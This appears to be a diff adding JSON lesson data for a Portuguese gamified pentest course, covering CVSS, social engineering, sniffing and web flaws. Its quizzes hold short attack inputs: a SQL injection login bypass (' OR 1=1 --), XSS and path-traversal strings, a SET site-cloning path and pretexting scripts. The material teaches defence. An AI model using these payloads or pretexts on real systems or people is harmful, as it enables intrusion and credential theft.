+        "content": "<b>CVE</b> é o identificador único de uma vulnerabilidade (ex: CVE-2021-44228). <b>CVSS</b> é a pontuação de gravidade (0-10). Score 9.0+ = Crítico.",
+        "highlight": "CVE = ID da falha, CVSS = gravidade"
+      },
+      {
+        "type": "example",
+        "icon": "fa-exclamation-triangle",
+        "title": "Log4Shell (CVE-2021-44228)",
+        "scenario": "O scanner Nessus identifica que o servidor alvo usa <b>Log4j 2.14</b>, vulnerável ao <b>Log4Shell</b> (CVSS 10.0). Essa falha permite execução remota de código com uma simples string no log.",
+        "takeaway": "CVSS 10.0 = exploração trivial com impacto máximo."
+      },
+      {
+        "type": "quiz",
+        "task": "O que representa a pontuação CVSS de uma vulnerabilidade?",
+        "options": [
+          "A gravidade da vulnerabilidade (0 a 10)",
+          "O preço para corrigir a falha",
+          "O número de sistemas afetados"
+        ],
+        "correctText": "A gravidade da vulnerabilidade (0 a 10)",
+        "explanation": "CVSS (Common Vulnerability Scoring System) vai de 0 (nenhum risco) a 10 (crítico)."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-circle-exclamation",
+        "title": "Falsos Positivos",
+        "content": "Scanners frequentemente reportam <b>falsos positivos</b> — vulnerabilidades que não existem na realidade. O pentester deve <b>validar manualmente</b> os resultados antes de reportar.",
+        "highlight": "Sempre valide! Nunca confie cegamente no scanner."
+      },
+      {
+        "type": "fill",
+        "sentence": "Quando um scanner reporta uma vulnerabilidade que não existe de fato, chamamos de ___.",
+        "options": [
+          "falso positivo",
+          "falso negativo",
+          "verdadeiro positivo"
+        ],
+        "correctText": "falso positivo",
+        "explanation": "Falso positivo = alerta sem vulnerabilidade real. Falso negativo = vulnerabilidade real não detectada."
+      },
+      {
+        "type": "match",
+        "title": "Ferramentas de Scanner",
+        "pairs": [
+          {
+            "term": "Nessus",
+            "definition": "Scanner comercial líder de mercado"
+          },
+          {
+            "term": "OpenVAS",
+            "definition": "Scanner open source gratuito"
+          },
+          {
+            "term": "Qualys",
+            "definition": "Scanner baseado em nuvem"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "3.4-analise-resultados.html",
+    "module": "3",
+    "title": "Análise de Resultados 3.4",
+    "victory_msg": "ANÁLISE DE VULNS CONCLUÍDA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-chart-bar",
+        "title": "Analisando Resultados",
+        "content": "Após o scan, o pentester recebe centenas de achados. O trabalho é <b>priorizar</b> por gravidade (CVSS), <b>validar</b> falsos positivos e <b>correlacionar</b> vulnerabilidades para encontrar cadeias de ataque.",
+        "highlight": "Priorização > Quantidade"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-layer-group",
+        "title": "Classificação de Severidade",
+        "content": "<b>Crítico (9.0-10.0)</b>: exploração trivial, impacto total. <b>Alto (7.0-8.9)</b>: exploração provável. <b>Médio (4.0-6.9)</b>: exploração possível. <b>Baixo (0.1-3.9)</b>: impacto limitado.",
+        "highlight": "Foque nos Críticos e Altos primeiro"
+      },
+      {
+        "type": "example",
+        "icon": "fa-link",
+        "title": "Cadeia de Ataque",
+        "scenario": "Individualmente: porta FTP aberta (médio) + senha fraca (médio) = acesso total ao servidor. <b>Combinadas</b>, duas vulnerabilidades médias criam um <b>risco crítico</b>.",
+        "takeaway": "Vulnerabilidades se combinam. Analise o contexto, não apenas o score individual."
+      },
+      {
+        "type": "quiz",
+        "task": "Por que o pentester deve validar manualmente os resultados do scanner?",
+        "options": [
+          "Para eliminar falsos positivos e confirmar vulnerabilidades reais",
+          "Porque scanners nunca encontram nada útil",
+          "Para aumentar o número de páginas do relatório"
+        ],
+        "correctText": "Para eliminar falsos positivos e confirmar vulnerabilidades reais",
+        "explanation": "Scanners automatizados geram falsos positivos. Validação manual é essencial."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-file-medical",
+        "title": "Documentação dos Achados",
+        "content": "Cada vulnerabilidade validada deve ser documentada com: <b>descrição</b>, <b>evidência</b> (screenshot/log), <b>impacto</b>, <b>CVSS</b>, e <b>recomendação de correção</b>.",
+        "highlight": "Sem evidência = achado descartável"
+      },
+      {
+        "type": "fill",
+        "sentence": "A pontuação CVSS de 9.0 a 10.0 classifica uma vulnerabilidade como ___.",
+        "options": [
+          "Crítica",
+          "Alta",
+          "Média"
+        ],
+        "correctText": "Crítica",
+        "explanation": "CVSS 9.0+ = Crítico, geralmente com exploração trivial e impacto máximo."
+      },
+      {
+        "type": "match",
+        "title": "CVSS → Severidade",
+        "pairs": [
+          {
+            "term": "9.0 - 10.0",
+            "definition": "Crítico"
+          },
+          {
+            "term": "7.0 - 8.9",
+            "definition": "Alto"
+          },
+          {
+            "term": "4.0 - 6.9",
+            "definition": "Médio"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "4.0-introducao.html",
+    "module": "4",
+    "title": "Engenharia Social 4.0",
+    "victory_msg": "ENGENHARIA SOCIAL INICIADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-people-arrows",
+        "title": "Engenharia Social",
+        "content": "<b>Engenharia Social</b> é a arte de manipular <b>pessoas</b> para que revelem informações ou executem ações. O elo mais fraco da segurança é sempre o <b>fator humano</b>.",
+        "highlight": "Pessoas são o alvo mais fácil"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-masks-theater",
+        "title": "Pretexting",
+        "content": "<b>Pretexting</b> é criar um cenário falso (pretexto) para enganar a vítima. O atacante assume uma identidade falsa, como um técnico de TI, para obter acesso ou informações.",
+        "highlight": "Pretexto = história inventada para enganar"
+      },
+      {
+        "type": "example",
+        "icon": "fa-phone",
+        "title": "Ligação Falsa de TI",
+        "scenario": "O atacante liga para um funcionário fingindo ser do suporte técnico: 'Oi, sou do TI. Precisamos atualizar sua conta. Me passe sua senha atual para eu migrar.'",
+        "takeaway": "Nunca forneça credenciais por telefone — TI legítimo não pede senhas."
+      },
+      {
+        "type": "quiz",
+        "task": "O que é pretexting em engenharia social?",
+        "options": [
+          "Criar uma identidade falsa para manipular a vítima",
+          "Usar força bruta para quebrar senhas",
+          "Escanear portas de rede com Nmap"
+        ],
+        "correctText": "Criar uma identidade falsa para manipular a vítima",
+        "explanation": "Pretexting = inventar um cenário convincente para que a vítima coopere."
+      },
+      {
+        "type": "fill",
+        "sentence": "O elo mais fraco da segurança da informação é o fator ___.",
+        "options": [
+          "humano",
+          "tecnológico",
+          "financeiro"
+        ],
+        "correctText": "humano",
+        "explanation": "Pessoas podem ser manipuladas, independente da qualidade da tecnologia."
+      },
+      {
+        "type": "match",
+        "title": "Tipos de Engenharia Social",
+        "pairs": [
+          {
+            "term": "Phishing",
+            "definition": "E-mail falso com link malicioso"
+          },
+          {
+            "term": "Pretexting",
+            "definition": "Cenário inventado para enganar"
+          },
+          {
+            "term": "Tailgating",
+            "definition": "Seguir alguém pela porta sem crachá"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "4.1-pretexting.html",
+    "module": "4",
+    "title": "Pretexting 4.1",
+    "victory_msg": "PRETEXTING DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-user-tie",
+        "title": "Impersonação",
+        "content": "O atacante se passa por alguém de confiança: <b>técnico de TI</b>, <b>gerente</b>, <b>entregador</b> ou <b>funcionário novo</b>. A chave é parecer legítimo e criar senso de urgência.",
+        "highlight": "Confiança é a ferramenta do ataque"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-clock",
+        "title": "Senso de Urgência",
+        "content": "Criar <b>urgência</b> faz a vítima agir sem pensar: 'Preciso disso AGORA ou vamos perder o acesso'. A pressão temporal bypassa o senso crítico.",
+        "highlight": "Urgência = pensamento desligado"
+      },
+      {
+        "type": "example",
+        "icon": "fa-envelope",
+        "title": "E-mail do CEO Falso",
+        "scenario": "O atacante envia um e-mail se passando pelo CEO: 'Preciso que faça uma transferência urgente de R$ 50.000 para este fornecedor. Faça AGORA, estou em reunião e não posso falar.'",
+        "takeaway": "CEO Fraud/BEC é um dos golpes mais lucrativos — sempre confirme por outro canal."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual técnica psicológica é mais usada para fazer a vítima agir sem pensar?",
+        "options": [
+          "Senso de urgência",
+          "Análise de dados",
+          "Criptografia de ponta a ponta"
+        ],
+        "correctText": "Senso de urgência",
+        "explanation": "Urgência força decisões rápidas, sem tempo para verificar a legitimidade."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-id-badge",
+        "title": "Construindo um Pretexto",
+        "content": "Um bom pretexto exige: <b>pesquisa sobre o alvo</b> (nomes, estrutura, projetos), <b>identidade coerente</b> (crachá, uniforme, e-mail), e <b>conhecimento do jargão</b> da empresa.",
+        "highlight": "Quanto mais pesquisa, mais convincente o pretexto"
+      },
+      {
+        "type": "fill",
+        "sentence": "Para criar um pretexto convincente, o atacante primeiro faz ___ sobre a empresa alvo.",
+        "options": [
+          "pesquisa/OSINT",
+          "varredura de portas",
+          "criptografia"
+        ],
+        "correctText": "pesquisa/OSINT",
+        "explanation": "OSINT sobre a empresa fornece nomes, hierarquia e jargão para criar um pretexto realista."
+      }
+    ]
+  },
+  {
+    "filename": "4.2-ataques-sociais.html",
+    "module": "4",
+    "title": "Ataques Sociais 4.2",
+    "victory_msg": "ATAQUES SOCIAIS MAPEADOS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-envelope-open-text",
+        "title": "Phishing",
+        "content": "<b>Phishing</b> é enviar e-mails falsos que imitam empresas legítimas para roubar credenciais ou instalar malware. É o ataque mais comum e mais eficaz da engenharia social.",
+        "highlight": "90% dos ataques começam com phishing"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-bullseye",
+        "title": "Spear Phishing e Whaling",
+        "content": "<b>Spear Phishing</b>: ataque direcionado a uma pessoa específica, usando informações pessoais. <b>Whaling</b>: spear phishing direcionado a executivos de alto escalão (CEO, CFO).",
+        "highlight": "Quanto mais direcionado, mais eficaz"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-comment-sms",
+        "title": "Smishing e Vishing",
+        "content": "<b>Smishing</b> = phishing via SMS. <b>Vishing</b> = phishing via voz/telefone. Ambos usam as mesmas técnicas de manipulação mas em canais diferentes.",
+        "highlight": "Phishing se adapta ao canal de comunicação"
+      },
+      {
+        "type": "match",
+        "title": "Tipo de Phishing → Canal",
+        "pairs": [
+          {
+            "term": "Phishing",
+            "definition": "E-mail"
+          },
+          {
+            "term": "Smishing",
+            "definition": "SMS"
+          },
+          {
+            "term": "Vishing",
+            "definition": "Ligação telefônica"
+          },
+          {
+            "term": "Whaling",
+            "definition": "E-mail para executivos"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual tipo de phishing é direcionado especificamente a executivos C-Level?",
+        "options": [
+          "Whaling",
+          "Smishing",
+          "Vishing"
+        ],
+        "correctText": "Whaling",
+        "explanation": "Whaling (caça à baleia) mira especificamente CEOs, CFOs e outros executivos de alto nível."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-water",
+        "title": "Watering Hole",
+        "content": "<b>Watering Hole</b>: o atacante infecta um site frequentemente visitado pelo alvo. Quando o alvo acessa o site comprometido, é infectado automaticamente.",
+        "highlight": "Infectar o site que o alvo já confia"
+      },
+      {
+        "type": "fill",
+        "sentence": "O ataque que infecta sites frequentados pelo alvo é chamado de ___.",
+        "options": [
+          "Watering Hole",
+          "Brute Force",
+          "Man-in-the-Middle"
+        ],
+        "correctText": "Watering Hole",
+        "explanation": "Watering Hole = 'poço d'água' — como predadores que esperam a presa ir beber."
+      }
+    ]
+  },
+  {
+    "filename": "4.3-ataques-fisicos.html",
+    "module": "4",
+    "title": "Ataques Físicos 4.3",
+    "victory_msg": "SEGURANÇA FÍSICA ASSIMILADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-door-open",
+        "title": "Tailgating",
+        "content": "<b>Tailgating</b> (ou piggybacking) é seguir um funcionário autorizado pela porta sem usar crachá. O atacante aproveita a cortesia da vítima que segura a porta.",
+        "highlight": "Nunca segure a porta para desconhecidos"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-usb",
+        "title": "USB Dropping",
+        "content": "<b>USB Dropping</b>: o atacante deixa pendrives infectados em estacionamentos ou cafeterias. A curiosidade faz alguém conectar o USB, instalando malware automaticamente.",
+        "highlight": "Curiosidade é o vetor de ataque"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-eye",
+        "title": "Shoulder Surfing",
+        "content": "<b>Shoulder Surfing</b>: observar por cima do ombro da vítima enquanto ela digita senhas ou PINs. Pode ser feito presencialmente ou com câmeras.",
+        "highlight": "Olhos podem roubar senhas"
+      },
+      {
+        "type": "quiz",
+        "task": "O que é tailgating?",
+        "options": [
+          "Seguir um funcionário pela porta sem autorização",
+          "Enviar e-mails de phishing",
+          "Escanear portas de rede remotamente"
+        ],
+        "correctText": "Seguir um funcionário pela porta sem autorização",
+        "explanation": "Tailgating explora a cortesia humana de segurar a porta para outros."
+      },
+      {
+        "type": "match",
+        "title": "Ataque Físico → Técnica",
+        "pairs": [
+          {
+            "term": "Tailgating",
+            "definition": "Seguir alguém pela porta"
+          },
+          {
+            "term": "USB Dropping",
+            "definition": "Pendrive infectado no chão"
+          },
+          {
+            "term": "Shoulder Surfing",
+            "definition": "Espiar senhas sendo digitadas"
+          },
+          {
+            "term": "Dumpster Diving",
+            "definition": "Vasculhar o lixo por documentos"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "O ataque que consiste em deixar pendrives infectados para serem encontrados é o ___.",
+        "options": [
+          "USB Dropping",
+          "Phishing",
+          "Brute Force"
+        ],
+        "correctText": "USB Dropping",
+        "explanation": "USB Dropping explora a curiosidade humana para instalar malware via pendrive."
+      }
+    ]
+  },
+  {
+    "filename": "4.4-ferramentas-sociais.html",
+    "module": "4",
+    "title": "Ferramentas Sociais 4.4",
+    "victory_msg": "TOOLKIT SOCIAL DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-toolbox",
+        "title": "SET (Social Engineering Toolkit)",
+        "content": "O <b>SET</b> é a principal ferramenta de engenharia social do Kali Linux. Ele automatiza ataques de phishing, clonagem de sites, criação de payloads e campanhas de spear phishing.",
+        "highlight": "SET = automação de engenharia social"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Clonando um Site com SET",
+        "scenario": "Usando o SET, você clona a página de login do e-mail corporativo do alvo. Quando um funcionário digita suas credenciais na página falsa, elas são capturadas pelo pentester.",
+        "code": "setoolkit > 1 > 2 > 3 > site_do_alvo.com",
+        "takeaway": "SET clona páginas de login em segundos para captura de credenciais."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-fish",
+        "title": "GoPhish",
+        "content": "<b>GoPhish</b> é uma plataforma open source para gerenciar campanhas de phishing. Ela permite criar templates de e-mail, rastrear quem abriu, clicou e inseriu credenciais.",
+        "highlight": "GoPhish = gestão profissional de campanhas de phishing"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta do Kali Linux automatiza ataques de engenharia social?",
+        "options": [
+          "SET (Social Engineering Toolkit)",
+          "Nmap",
+          "Wireshark"
+        ],
+        "correctText": "SET (Social Engineering Toolkit)",
+        "explanation": "O SET é dedicado exclusivamente a ataques de engenharia social."
+      },
+      {
+        "type": "fill",
+        "sentence": "A plataforma open source para gerenciar campanhas de phishing é o ___.",
+        "options": [
+          "GoPhish",
+          "Metasploit",
+          "Burp Suite"
+        ],
+        "correctText": "GoPhish",
+        "explanation": "GoPhish permite criar, enviar e rastrear campanhas de phishing de forma organizada."
+      },
+      {
+        "type": "match",
+        "title": "Ferramenta → Uso",
+        "pairs": [
+          {
+            "term": "SET",
+            "definition": "Automação de ataques sociais"
+          },
+          {
+            "term": "GoPhish",
+            "definition": "Gestão de campanhas phishing"
+          },
+          {
+            "term": "BeEF",
+            "definition": "Exploração de browsers via XSS"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "filename": "4.5-metodos-influencia.html",
+    "module": "4",
+    "title": "Métodos de Influência 4.5",
+    "victory_msg": "PSICOLOGIA DA INFLUÊNCIA DOMINADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-brain",
+        "title": "Princípios de Cialdini",
+        "content": "Robert Cialdini identificou 6 princípios de influência usados em engenharia social: <b>Reciprocidade</b>, <b>Comprometimento</b>, <b>Prova Social</b>, <b>Autoridade</b>, <b>Escassez</b> e <b>Simpatia</b>.",
+        "highlight": "6 gatilhos psicológicos da manipulação"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-hand-holding-heart",
+        "title": "Reciprocidade",
+        "content": "<b>Reciprocidade</b>: quando alguém faz algo por nós, sentimos obrigação de retribuir. 'Te ajudei com aquilo... agora preciso de um favor pequeno (sua senha)'.",
+        "highlight": "Favor gera dívida psicológica"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-crown",
+        "title": "Autoridade",
+        "content": "<b>Autoridade</b>: tendemos a obedecer figuras de autoridade sem questionar. 'Sou o diretor de TI e preciso do acesso agora'. Uniformes, títulos e tom assertivo reforçam a ilusão.",
+        "highlight": "Autoridade falsa = obediência cega"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-hourglass-half",
+        "title": "Escassez e Urgência",
+        "content": "<b>Escassez</b>: quando algo é limitado ou urgente, tomamos decisões impulsivas. 'Esta oferta expira em 5 minutos!' ou 'Sua conta será bloqueada se não agir agora!'.",
+        "highlight": "Tempo limitado = decisão sem análise"
+      },
+      {
+        "type": "match",
+        "title": "Princípio → Exemplo",
+        "pairs": [
+          {
+            "term": "Reciprocidade",
+            "definition": "'Te ajudei, agora me ajude'"
+          },
+          {
+            "term": "Autoridade",
+            "definition": "'Sou o diretor, obedeça'"
+          },
+          {
+            "term": "Escassez",
+            "definition": "'Expira em 5 minutos!'"
+          },
+          {
+            "term": "Prova Social",
+            "definition": "'Todos já fizeram isso'"
+          }
+        ]
+      },
+      {
+        "type": "quiz",
+        "task": "Qual princípio de Cialdini faz a vítima obedecer por medo de uma figura de poder?",
+        "options": [
+          "Autoridade",
+          "Reciprocidade",
+          "Simpatia"
+        ],
+        "correctText": "Autoridade",
+        "explanation": "Autoridade explora nossa tendência de obedecer quem parece ter poder ou posição."
+      },
+      {
+        "type": "fill",
+        "sentence": "O princípio que cria pressão por tempo limitado é o da ___.",
+        "options": [
+          "Escassez",
+          "Reciprocidade",
+          "Simpatia"
+        ],
+        "correctText": "Escassez",
+        "explanation": "Escassez cria urgência artificial: 'aja agora ou perde a oportunidade'."
+      }
+    ]
+  },
+  {
+    "filename": "5.0-introducao.html",
+    "module": "5",
+    "title": "Exploração de Redes 5.0",
+    "victory_msg": "REDES INICIADAS!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-network-wired",
+        "title": "Exploração de Redes",
+        "content": "Este módulo cobre a exploração de vulnerabilidades em <b>redes com fio</b> e <b>sem fio (wireless)</b>. Inclui ataques a protocolos, sniffing de tráfego, e ataques a redes WiFi.",
+        "highlight": "A rede é o campo de batalha principal"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shuffle",
+        "title": "Protocolos Vulneráveis",
+        "content": "Protocolos antigos transmitem dados em <b>texto claro</b>: <b>FTP</b> (porta 21), <b>Telnet</b> (porta 23), <b>HTTP</b> (porta 80). Isso permite interceptação via sniffing.",
+        "highlight": "Texto claro = dados expostos para qualquer um"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Sniffing de Credenciais",
+        "scenario": "Usando <b>Wireshark</b> na rede, o pentester captura um login FTP em texto claro: <b>USER admin / PASS 123456</b>. O funcionário nem percebe que foi interceptado.",
+        "code": "wireshark -i eth0 -f 'port 21'",
+        "takeaway": "FTP, Telnet e HTTP transmitem credenciais sem criptografia."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual protocolo transmite credenciais em texto claro na porta 23?",
+        "options": [
+          "Telnet",
+          "SSH",
+          "HTTPS"
+        ],
+        "correctText": "Telnet",
+        "explanation": "Telnet (porta 23) não usa criptografia. SSH (porta 22) é a alternativa segura."
+      },
+      {
+        "type": "match",
+        "title": "Protocolo → Porta",
+        "pairs": [
+          {
+            "term": "FTP",
+            "definition": "Porta 21"
+          },
+          {
+            "term": "SSH",
+            "definition": "Porta 22"
+          },
+          {
+            "term": "Telnet",
+            "definition": "Porta 23"
+          },
+          {
+            "term": "HTTP",
+            "definition": "Porta 80"
+          }
+        ]
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta usada para capturar e analisar tráfego de rede é o ___.",
+        "options": [
+          "Wireshark",
+          "Nmap",
+          "Metasploit"
+        ],
+        "correctText": "Wireshark",
+        "explanation": "Wireshark é o principal analisador de protocolos de rede (sniffer)."
+      }
+    ]
+  },
+  {
+    "filename": "6.0-introducao.html",
+    "module": "6",
+    "title": "Segurança Web 6.0",
+    "victory_msg": "SEGURANÇA WEB INICIADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-globe",
+        "title": "Vulnerabilidades Web",
+        "content": "Este módulo cobre as vulnerabilidades mais comuns em <b>aplicações web</b>, incluindo o <b>OWASP Top 10</b> — as 10 categorias de riscos mais críticos.",
+        "highlight": "Web é o vetor de ataque nº 1"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-list-ol",
+        "title": "OWASP Top 10",
+        "content": "O <b>OWASP Top 10</b> classifica os riscos mais críticos: Injection, Broken Authentication, XSS, CSRF, Security Misconfiguration, entre outros.",
+        "highlight": "OWASP = bíblia da segurança web"
+      },
+      {
+        "type": "example",
+        "icon": "fa-code",
+        "title": "Aplicações Vulneráveis de Treino",
+        "scenario": "<b>DVWA</b> (Damn Vulnerable Web Application) e <b>Juice Shop</b> são apps intencionalmente vulneráveis para praticar os ataques do OWASP Top 10 em ambiente seguro.",
+        "takeaway": "Sempre pratique em aplicações de laboratório, nunca em produção."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual organização mantém a lista das 10 vulnerabilidades web mais críticas?",
+        "options": [
+          "OWASP",
+          "IEEE",
+          "W3C"
+        ],
+        "correctText": "OWASP",
+        "explanation": "OWASP (Open Web Application Security Project) mantém o Top 10 atualizado."
+      },
+      {
+        "type": "fill",
+        "sentence": "A aplicação web intencionalmente vulnerável mais popular para treino é o ___.",
+        "options": [
+          "DVWA",
+          "WordPress",
+          "Apache"
+        ],
+        "correctText": "DVWA",
+        "explanation": "DVWA = Damn Vulnerable Web Application, feita para praticar ataques web em segurança."
+      }
+    ]
+  },
+  {
+    "filename": "6.2-lab-setup.html",
+    "module": "6",
+    "title": "Lab Setup Web 6.2",
+    "victory_msg": "LAB WEB CONFIGURADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-flask",
+        "title": "Montando o Lab Web",
+        "content": "Para praticar ataques web, instale: <b>DVWA</b> ou <b>Juice Shop</b> em uma VM, <b>Burp Suite</b> como proxy de interceptação, e configure o browser para rotear tráfego pelo Burp.",
+        "highlight": "Burp Suite = ferramenta central do pentester web"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Burp Suite como Proxy",
+        "scenario": "Configure o Firefox para usar <b>127.0.0.1:8080</b> como proxy. Todo o tráfego HTTP/HTTPS passa pelo Burp Suite, onde você pode interceptar, modificar e repetir requisições.",
+        "takeaway": "Burp Suite permite ver e manipular cada requisição HTTP."
+      },
+      {
+        "type": "quiz",
+        "task": "Qual ferramenta age como proxy de interceptação para analisar tráfego web?",
+        "options": [
+          "Burp Suite",
+          "Nmap",
+          "Wireshark"
+        ],
+        "correctText": "Burp Suite",
+        "explanation": "Burp Suite intercepta HTTP/HTTPS entre o browser e o servidor, permitindo análise e manipulação."
+      },
+      {
+        "type": "fill",
+        "sentence": "A ferramenta que intercepta e permite modificar requisições HTTP entre o browser e o servidor é o ___.",
+        "options": [
+          "Burp Suite",
+          "Metasploit",
+          "Nessus"
+        ],
+        "correctText": "Burp Suite",
+        "explanation": "Burp Suite é o padrão da indústria para testes de segurança em aplicações web."
+      }
+    ]
+  },
+  {
+    "filename": "6.3-logica-negocio.html",
+    "module": "6",
+    "title": "Lógica de Negócio 6.3",
+    "victory_msg": "LÓGICA DE NEGÓCIO ANALISADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-diagram-project",
+        "title": "Falhas de Lógica",
+        "content": "<b>Falhas de lógica de negócio</b> são bugs que não violam regras técnicas, mas permitem abusar do <b>fluxo esperado</b>. Ex: comprar com preço negativo, pular etapas de pagamento.",
+        "highlight": "A lógica errada é tão perigosa quanto código vulnerável"
+      },
+      {
+        "type": "example",
+        "icon": "fa-cart-shopping",
+        "title": "Preço Negativo",
+        "scenario": "O atacante modifica o preço de um produto de R$100 para <b>-R$100</b> via Burp Suite. O sistema aceita e <b>credita</b> R$100 na conta do atacante em vez de cobrar.",
+        "takeaway": "Sempre valide valores no servidor, nunca confie no cliente."
+      },
+      {
+        "type": "quiz",
+        "task": "O que é uma falha de lógica de negócio?",
+        "options": [
+          "Abuso do fluxo esperado da aplicação (ex: preço negativo)",
+          "Um erro de sintaxe no código JavaScript",
+          "Um vírus que infecta o servidor web"
+        ],
+        "correctText": "Abuso do fluxo esperado da aplicação (ex: preço negativo)",
+        "explanation": "Falhas de lógica exploram comportamentos não previstos no design da aplicação."
+      },
+      {
+        "type": "fill",
+        "sentence": "Falhas de ___ permitem abusar do fluxo da aplicação sem violar regras técnicas.",
+        "options": [
+          "lógica de negócio",
+          "criptografia",
+          "autenticação"
+        ],
+        "correctText": "lógica de negócio",
+        "explanation": "Logic flaws exploram a lógica do negócio, não vulnerabilidades técnicas tradicionais."
+      }
+    ]
+  },
+  {
+    "filename": "6.4-injecao-web.html",
+    "module": "6",
+    "title": "Injeção Web 6.4",
+    "victory_msg": "SQL INJECTION DOMINADO!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-syringe",
+        "title": "SQL Injection",
+        "content": "<b>SQL Injection</b> ocorre quando entrada do usuário é inserida diretamente em uma query SQL sem sanitização. O atacante pode <b>ler</b>, <b>modificar</b> ou <b>deletar</b> dados do banco.",
+        "highlight": "A vulnerabilidade web mais perigosa"
+      },
+      {
+        "type": "example",
+        "icon": "fa-terminal",
+        "title": "Login Bypass",
+        "scenario": "No campo de login, o atacante digita: <b>' OR 1=1 --</b>. A query se torna: SELECT * FROM users WHERE user='' OR 1=1 --' AND pass=''. Como 1=1 é sempre verdadeiro, o login é bypassed.",
+        "code": "' OR 1=1 --",
+        "takeaway": "Nunca concatene entrada do usuário em queries SQL."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-database",
+        "title": "Tipos de SQLi",
+        "content": "<b>In-band</b>: resultado aparece na página. <b>Blind</b>: sem output visível, infere dados por comportamento (True/False). <b>Out-of-band</b>: exfiltra dados via DNS ou HTTP.",
+        "highlight": "Mesmo sem output visível, SQLi ainda funciona (Blind)"
+      },
+      {
+        "type": "quiz",
+        "task": "Qual payload básico testa SQL Injection em um campo de login?",
+        "options": [
+          "' OR 1=1 --",
+          "<script>alert(1)</script>",
+          "../../../etc/passwd"
+        ],
+        "correctText": "' OR 1=1 --",
+        "explanation": "' OR 1=1 -- fecha a string, injeta condição sempre verdadeira e comenta o resto."
+      },
+      {
+        "type": "teach",
+        "icon": "fa-shield-halved",
+        "title": "Prevenção de SQLi",
+        "content": "<b>Prepared Statements</b> (parameterized queries) são a defesa principal. Nunca concatene entrada do usuário. Use <b>ORM</b> quando possível e aplique <b>input validation</b>.",
+        "highlight": "Prepared Statements = imunidade contra SQLi"
+      },
+      {
+        "type": "fill",
+        "sentence": "A defesa principal contra SQL Injection é usar ___ em vez de concatenar entradas.",
+        "options": [
+          "Prepared Statements",
+          "firewall",
+          "antivírus"
+        ],
+        "correctText": "Prepared Statements",
+        "explanation": "Prepared Statements separam dados de código SQL, eliminando a possibilidade de injeção."
+      }
+    ]
+  },
+  {
+    "filename": "6.5-autenticacao.html",
+    "module": "6",
+    "title": "Autenticação 6.5",
+    "victory_msg": "AUTENTICAÇÃO ANALISADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-right-to-bracket",
+        "title": "Falhas de Autenticação",
+        "content": "<b>Broken Authentication</b> permite que atacantes comprometam senhas, tokens ou sessões. Inclui: senhas fracas, falta de MFA, session fixation e brute force sem limitação.",
+        "highlight": "Autenticação quebrada = identidade roubada"
+      },
+      {
+        "type": "teach",
+        "icon": "fa-key",
+        "title": "Session Hijacking",
+        "content": "<b>Session Hijacking</b>: o atacante rouba o cookie de sessão da vítima (via XSS ou sniffing) e assume a sessão autenticada sem precisar de senha.",
+        "highlight": "Cookie roubado = sessão completa"
+      },
+      {
+        "type": "quiz",
+        "task": "O que é Session Hijacking?",
+        "options": [
+          "Roubar o cookie de sessão para assumir a conta da vítima",
+          "Alterar a senha do usuário pelo painel admin",
+          "Enviar e-mails de phishing para o suporte"
+        ],
+        "correctText": "Roubar o cookie de sessão para assumir a conta da vítima",
+        "explanation": "Com o cookie de sessão, o atacante é tratado como o usuário legítimo pelo servidor."
+      },
+      {
+        "type": "fill",
+        "sentence": "A técnica de roubar cookies de sessão para assumir a identidade da vítima é o ___.",
+        "options": [
+          "Session Hijacking",
+          "SQL Injection",
+          "Brute Force"
+        ],
+        "correctText": "Session Hijacking",
+        "explanation": "Session Hijacking permite assumir sessões sem conhecer credenciais."
+      }
+    ]
+  },
+  {
+    "filename": "6.6-autorizacao.html",
+    "module": "6",
+    "title": "Autorização 6.6",
+    "victory_msg": "AUTORIZAÇÃO ANALISADA!",
+    "steps": [
+      {
+        "type": "teach",
+        "icon": "fa-user-lock",
+        "title": "Broken Access Control",
